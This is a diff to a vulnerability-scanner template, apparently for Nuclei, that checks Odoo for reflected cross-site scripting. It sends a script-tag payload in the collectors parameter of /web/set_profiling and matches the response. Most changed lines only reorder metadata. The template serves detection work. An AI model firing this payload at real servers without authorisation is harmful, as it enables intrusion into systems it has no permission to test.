@@ -1,4 +1,5 @@
 id: odoo-xss
+
 info:
   name: Odoo - Cross-Site Scripting
   author: DhiyaneshDK
@@ -16,17 +17,18 @@ info:
     cwe-id: CWE-79
     cpe: cpe:2.3:a:odoo:odoo:*:*:*:*:*:*:*:*
   metadata:
-    runzero-match: any(each(service["html.titles"]), {# matches "^Odoo$"})
-    max-request: 1
-    product: odoo
-    shodan-query: title:"Odoo"
-    vendor: odoo
     verified: true
-  tags: odoo,vkev,vuln,xss
+    max-request: 1
+    shodan-query: title:"Odoo"
+    product: odoo
+    vendor: odoo
+  tags: odoo,xss,vkev,vuln
+
 http:
   - method: GET
     path:
       - "{{BaseURL}}/web/set_profiling?profile=0&collectors=<script>alert(document.domain)</script>"
+
     matchers-condition: and
     matchers:
       - type: word
@@ -36,11 +38,13 @@ http:
           - '"params":'
           - 'session'
         condition: and
+
       - type: word
         part: header
         words:
           - "text/html"
+
       - type: status
         status:
           - 200
-        # digest: 4a0a0047304502200dd0db293a31ce23c29e4bff79113f351c10b55565442fcad17adefe24468237022100f0eb5b69f728da001807aebaea58baaceeed87161601e66e905840624a4bdb09:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a0047304502200dd0db293a31ce23c29e4bff79113f351c10b55565442fcad17adefe24468237022100f0eb5b69f728da001807aebaea58baaceeed87161601e66e905840624a4bdb09:922c64590222798bb761d5b6d8e72950
